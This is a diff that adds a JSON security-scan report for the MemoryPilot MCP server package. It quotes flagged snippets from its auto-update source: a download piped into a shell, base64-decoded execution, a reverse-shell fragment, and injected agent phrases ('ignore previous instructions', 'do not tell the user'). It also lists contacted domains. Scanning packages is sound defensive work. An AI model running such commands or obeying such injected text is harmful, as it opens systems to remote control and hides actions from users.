@@ -1,0 +1,143 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Soflutionltd/MemoryPilot",
+    "version": "1b4127c56e2946bd647c91add4f9d843a36179a7",
+    "download": "https://codeload.github.com/Soflutionltd/MemoryPilot/tar.gz/1b4127c56e2946bd647c91add4f9d843a36179a7"
+  },
+  "archive_sha256": "56e9c506c641222c55ede6ec6f4a55b22baf5c78e6fbe6438d64bb0bfcd208a8",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/src/auto_update.rs",
+      "line": 874,
+      "evidence": "curl https://example.com/install.sh | sh",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/src/auto_update.rs",
+      "line": 920,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/src/auto_update.rs",
+      "line": 921,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/src/auto_update.rs",
+      "line": 353,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/src/auto_update.rs",
+      "line": 357,
+      "evidence": "do not tell the user",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/README.md",
+      "line": 377,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Soflutionltd/MemoryPilot/main/insta",
+      "file_sha256": "dc3a7ce6333fee10f0e48e86f3878be65073c99001445dac47e8bc7eff50bcb0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-1b4127c56e2946bd647c91add4f9d843a36179a7/install.sh",
+      "line": 208,
+      "evidence": "curl | bash",
+      "file_sha256": "5b3cdf2f87e80d031e0dc63bab5f03705125a107739545dab0c5cbddf4f39834"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "a.b, developers.example.com, developers.facebook.com, example.invalid, staging.example.com, status.example.com, www.apache.org",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "a.b",
+    "anthropic.com",
+    "api.anthropic.com",
+    "api.example.com",
+    "api.openai.com",
+    "api.supabase.com",
+    "app.example.com",
+    "arxiv.org",
+    "chatgpt.com",
+    "claude.ai",
+    "creativecommons.org",
+    "cursor.com",
+    "dart.dev",
+    "demo.example.com",
+    "developers.example.com",
+    "developers.facebook.com",
+    "docs.example.com",
+    "evil.example",
+    "example.com",
+    "example.invalid",
+    "github.com",
+    "huggingface.co",
+    "img.shields.io",
+    "jina.ai",
+    "localhost.example.com",
+    "matplotlib.org",
+    "mcp.example.com",
+    "mem0.ai",
+    "memory.example",
+    "opencollective.com",
+    "paulmillr.com",
+    "postgres.abcdef",
+    "pub.dev",
+    "purl.org",
+    "raw.githubusercontent.com",
+    "registry.modelcontextprotocol.io",
+    "registry.npmjs.org",
+    "rustup.rs",
+    "sociomator.com",
+    "soflution.com",
+    "staging.example.com",
+    "static.modelcontextprotocol.io",
+    "status.example.com",
+    "supermemory.ai",
+    "svelte.dev",
+    "tidelift.com",
+    "www.apache.org",
+    "www.apple.com",
+    "www.example.com",
+    "www.getzep.com",
+    "www.w3.org",
+    "x.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
